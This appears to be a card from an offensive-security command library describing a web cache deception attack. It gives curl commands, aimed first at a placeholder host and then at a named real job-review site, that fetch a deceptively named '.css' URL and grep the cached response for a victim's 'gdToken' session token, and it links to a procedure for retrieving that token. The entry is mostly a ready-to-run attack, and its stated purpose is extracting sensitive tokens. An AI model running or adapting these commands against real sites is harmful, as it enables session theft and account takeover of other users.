---
data: 'curl "https://target.com/dynamic-endpoint.css"'
tags:
  - web
  - exfiltration
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 9b7e9c8d-5d20-46c8-b3b4-9d16955ea56a
created_at: '2025-12-13T09:00:34.582Z'
updated_at: '2025-12-13T09:00:34.582Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-cached-response

## Command

```bash
curl "https://target.com/dynamic-endpoint.css"
```

## Description

Fetches a cached response from a deceptive URL to extract sensitive information like tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The cached deceptive URL | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.glassdoor.com/dynamic-endpoint.css"
```

### Advanced Usage

```bash
curl "https://www.glassdoor.com/dynamic-endpoint.css" | grep "gdToken"
```

## Expected Output

Cached content including the gdToken.

## Related

- [[procedures/Retrieve-Cached-gdToken-from-Web-Cache]]
